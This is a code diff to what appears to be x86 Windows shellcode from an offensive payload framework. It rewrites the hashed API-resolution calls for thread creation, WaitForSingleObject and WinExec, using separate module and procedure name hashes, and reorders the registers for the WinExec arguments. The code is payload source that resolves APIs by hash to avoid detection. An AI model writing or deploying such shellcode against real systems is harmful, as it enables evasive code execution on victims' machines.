@@ -19,16 +19,18 @@ entry:
   push 0                                ; dwStackSize
   push 0                                ; lpThreadAttributes
   push 6                                ; set num arguments
-  push 0xE2C019B2                       ; set hash key
-  push 0x2160C16A                       ; set function hash
+  push 0x350B81FD                       ; set hash key
+  push 0x0E1397A1                       ; set procedure name hash
+  push 0x92E999D5                       ; set module name hash
   call api_call                         ; call api function
 
   ; call "kernel32.dll, WaitForSingleObject"
   push 1000                             ; set dwMilliseconds
   push eax                              ; set thread handle
   push 2                                ; set num arguments
-  push 0x0F929559                       ; set hash key
-  push 0x2811A50E                       ; set function hash
+  push 0xE58310AB                       ; set hash key
+  push 0x0EDBA1DE                       ; set procedure name hash
+  push 0x49D3C84A                       ; set module name hash
   call api_call                         ; call api function
 
   ; restore context
@@ -49,14 +51,15 @@ win_exec:
   cld                                   ; clear the direction flag
 
   ; call "kernel32.dll, WinExec"
-  lea edx, [ebx+command]                ; lpCmdLine
-  xor ecx, ecx                          ; clear ecx
-  mov cl, [ebx+cmd_show]                ; set uCmdShow
-  push ecx                              ; push uCmdShow
-  push edx                              ; push lpCmdLine
+  lea ecx, [ebx+command]                ; lpCmdLine
+  xor edx, edx                          ; clear ecx
+  mov dl, [ebx+cmd_show]                ; set uCmdShow
+  push edx                              ; push uCmdShow
+  push ecx                              ; push lpCmdLine
   push 2                                ; set num arguments
-  push 0x61DA2999                       ; set hash key
-  push 0x0AE20914                       ; set function hash
+  push 0x4D5AF344                       ; set hash key
+  push 0xFB16D6BD                       ; set procedure name hash
+  push 0x21F98D89                       ; set module name hash
   call api_call                         ; call api function
 
   ; restore context
